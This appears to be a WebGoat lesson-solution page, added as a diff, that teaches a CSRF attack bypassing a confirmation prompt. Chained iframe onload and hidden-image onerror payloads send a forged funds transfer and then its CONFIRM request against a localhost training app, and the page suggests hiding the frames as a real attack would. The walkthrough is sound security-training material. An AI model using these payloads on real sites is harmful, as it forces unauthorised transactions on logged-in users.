@@ -1,0 +1,109 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Client Side Filtering</title>
+<link rel="stylesheet" type="text/css" href="lesson_solutions/formate.css">
+</head>
+<body>
+<p><b>Lesson Plan Title:</b>Prompt By-Pass with CSRF</p>
+
+<p><b>Concept / Topic To Teach:</b><br/>
+This lesson teaches how to perform Cross Site Request Forgery (CSRF) attacks containing 
+multiple requests to by-pass a scriptable user-prompt
+</p> 
+
+<p><b>General Goal(s):</b><br/>
+Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains multiple 
+malicious requests: the first to transfer funds, and the second a request to confirm the prompt 
+that the first request triggered.  The URL should point to the CSRF lesson with an extra 
+parameter "transferFunds=4000", and "transferFunds=CONFIRM". You can copy the shortcut from the 
+left hand menu by right clicking on the left hand menu and choosing copy shortcut. Whoever 
+receives this email and happens to be authenticated at that time will have his funds transferred. 
+When you think the attack is successful, refresh the page and you will find the green check on 
+the left hand side menu
+</p>
+
+<b>Solution:</b><br/>
+
+<p>Start by crafting an image or iframe tag similar to the CSRF LAB: <code>&lt;img
+src="http://localhostattack?Screen=81&amp;menu=210&amp;transferFunds=5000"
+width="1" height="1" /&gt;</code> 
+
+This image request will not result in a transfer of funds but will instead 
+prompt the user for confirmation.  To see the confirmation prompt, try typing in the URL of the
+Lesson with the extra parameter of "transferFunds=4000" <br/>   
+ 
+<img src="lesson_solutions/CsrfPromptByPass_files/transferFundsPrompt.png" alt="User Prompt for confirmation of the transfer of funds" /><br>
+<font size="2"><b>User Prompt</b></font>
+</p>
+<p>
+Next look at the source of the page to see what parameters the confirmation requires. 
+The form in the confirmation prompt looks like the following:
+<code>
+
+<pre id="line548">&lt;<span class="start-tag">form</span><span class="attribute-name"> accept-charset</span>=<span class="attribute-value">'UNKNOWN' </span><span class="attribute-name">method</span>=<span class="attribute-value">'POST' </span><span class="attribute-name">action</span>=<span class="attribute-value">'attack?Screen=5&amp;menu=900' </span><span class="attribute-name">enctype</span>=<span class="attribute-value">'application/x-www-form-urlencoded'</span>&gt;
+	&lt;<span class="start-tag">input</span><span class="attribute-name"> name</span>=<span class="attribute-value">'transferFunds' </span><span class="attribute-name">type</span>=<span class="attribute-value">'submit' </span><span class="attribute-name">value</span>=<span class="attribute-value">'CONFIRM'</span>&gt;
+	&lt;<span class="start-tag">input</span><span class="attribute-name"> name</span>=<span class="attribute-value">'transferFunds' </span><span class="attribute-name">type</span>=<span class="attribute-value">'submit' </span><span class="attribute-name">value</span>=<span class="attribute-value">'CANCEL'</span>&gt;
+&lt;/<span class="end-tag">form</span>&gt;</pre></code>
+
+From this we see the next forged command will need the folllowing URL:  <br/>
+<code>attack?Screen=5&menu=900&transferFunds=CONFIRM</code><br/>
+This solution shows how to do this attack with both iframes and images.  The next step is to 
+add the additional forged confirmation request.  However, an additional iframe or image with 
+this URL will not be sufficient.  The second request must load after the first.  So add 
+Javascript to load the second command after the first.  For iframes, make the onload attribute 
+of the first frame set the src of the second iframe:<br/>
+
+<code>
+<pre id="line578">&lt;<span class="start-tag">iframe</span><span class="attribute-name">
+	src</span>=<span class="attribute-value">"http://localhost:8080/WebGoat/attack?Screen=5&amp;menu=900&amp;transferFunds=400"
+	</span><span class="attribute-name">id</span>=<span class="attribute-value">"myFrame" </span><span class="attribute-name">frameborder</span>=<span class="attribute-value">"1" </span><span class="attribute-name">marginwidth</span>=<span class="attribute-value">"0"
+	</span><span class="attribute-name">marginheight</span>=<span class="attribute-value">"0" </span><span class="attribute-name">width</span>=<span class="attribute-value">"800" </span><span class="attribute-name">scrolling</span>=<span class="attribute-value">yes </span><span class="attribute-name">height</span>=<span class="attribute-value">"300"
+	</span><span class="attribute-name">onload</span>=<span class="attribute-value">"document.getElementById('frame2').src='http://localhost:8080/WebGoat/attack?Screen=5&amp;menu=900&amp;transferFunds=CONFIRM';"</span>&gt;
+</pre><pre id="line591">&lt;/<span class="end-tag">iframe</span>&gt;
+	
+&lt;<span class="start-tag">iframe</span><span class="attribute-name">
+	id</span>=<span class="attribute-value">"frame2" </span><span class="attribute-name">frameborder</span>=<span class="attribute-value">"1" </span><span class="attribute-name">marginwidth</span>=<span class="attribute-value">"0"
+	</span><span class="attribute-name">marginheight</span>=<span class="attribute-value">"0" </span><span class="attribute-name">width</span>=<span class="attribute-value">"800" </span><span class="attribute-name">scrolling</span>=<span class="attribute-value">yes </span><span class="attribute-name">height</span>=<span class="attribute-value">"300"</span>&gt;
+&lt;/<span class="end-tag">iframe</span>&gt;
+</pre>
+</code>
+
+Next add the iframes into a message stored on the web page:<br/>
+<img src="lesson_solutions/CsrfPromptByPass_files/iframePromptHack.png" alt="Picture of embedded message" /><br>
+<font size="2"><b>Insert iframes hack picture</b></font><br/>
+<p>
+The following shows the result of clicking on the malicious iframe message:
+<img src="lesson_solutions/CsrfPromptByPass_files/iframePromptHacked.png" alt="Picture of the malicious iframe message" /><br>
+<font size="2"><b>Results of iframes hack picture</b></font><br/>
+In the above image, note that the first frame shows the user prompt, the result of the 
+first forged request to transfer funds.  In the second frame the results of the second 
+forged request (the confirmation) are shown, indicating that 4000 dollars were successfully 
+transfered.  Refreshing the page will indicate that this lesson has been completed.  
+</p>
+<p>
+In a real attack these results would be hidden from the end user.  Click "restart this lesson" 
+to attempt the attack again, only this time try hiding the attack with hidden or very small frames. 
+</p>
+<p>
+For images, loading an html page as an image will cause an error.  So instead of using the onload attribute, use onerror:
+<br/>
+<code>
+&lt;img
+src="http://localhostattack?Screen=81&amp;menu=210&amp;transferFunds=5000"
+onerror="document.getElementById('image2').src='http://localhostattack?Screen=81&amp;menu=210&amp;transferFunds=CONFIRM'" 
+width="1" height="1" /&gt;
+&lt;img
+id="image2"
+width="1" height="1" /&gt;
+</code>
+<br/>
+Next store the malicious images in a message and click the message to attempt the attack. 
+<img src="lesson_solutions/CsrfPromptByPass_files/imgPromptHack.png" alt="Picture of the malicious iframe message" /><br>
+<font size="2"><b>Picture of adding malicious image requests</b></font><br/>
+Refreshing the page should indicate that this lesson has been completed.  Congratulations.  One way for developers to limit
+CSRF attacks is to only allow requests to be issued via HTTP Post.  That would remove any attacks by images or iframes, but 
+not for XmlHttpRequests in Javascript. For extra credit, you could try the same attack but instead use XmlHttpRequest over post.    
+</body>
+</html>
